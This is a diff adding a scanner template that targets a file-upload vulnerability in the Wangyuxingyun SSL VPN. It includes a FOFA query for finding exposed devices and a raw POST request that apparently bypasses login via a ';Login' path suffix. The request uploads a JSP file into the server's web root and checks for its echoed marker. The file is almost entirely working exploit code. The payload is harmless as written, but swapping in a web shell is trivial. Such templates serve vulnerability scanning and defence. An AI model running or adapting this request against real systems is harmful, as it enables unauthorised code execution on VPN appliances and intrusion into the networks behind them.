@@ -1,0 +1,41 @@
+id: wangyuxingyun-sslvpn-file-upload
+
+info:
+  name: Wangyuxingyun Sslvpn File Upload
+  author: zp857
+  severity: critical
+  tags: wangyuxingyun,rce,wangyuxingyun-sslvpn
+  metadata:
+    fofa-query: 'app="网御星云-SSL-VPN" || body="/SSL/down/head.gif" || body="/SSL/admin/X_AdministratorLogin"'
+
+requests:
+  - raw:
+      - |
+        POST /SSL/admin/so/FileManager.jsp;Login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;boundary=---------------------------14363957691640013656756907147
+
+        -----------------------------14363957691640013656756907147
+        Content-Disposition: form-data; name="BASE_NAME"
+
+        /ssl/tomcat/webapps/SSL
+        -----------------------------14363957691640013656756907147
+        Content-Disposition: form-data; name="uploadFile"; filename="MgoBgCLGMzurs98d.jsp"
+        Content-Type: image/jpeg
+
+        <% String str="MgoBgCLGMzurs98d"; out.print(str); %>
+        -----------------------------14363957691640013656756907147
+        Content-Disposition: form-data; name="submit"
+
+
+        -----------------------------14363957691640013656756907147--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "MgoBgCLGMzurs98d"
+
+      - type: status
+        status:
+          - 200
